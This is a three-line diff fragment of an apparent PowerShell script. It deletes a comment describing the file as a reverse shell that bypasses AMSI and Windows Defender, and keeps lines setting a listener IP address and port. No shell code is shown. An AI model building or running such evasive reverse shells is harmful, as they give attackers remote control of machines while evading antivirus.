@@ -1,4 +1,3 @@
-# Reverse shell, currently able to bypass AMSI/Windows Defender
 $ip = '172.16.8.1'
 $port = 4443
 
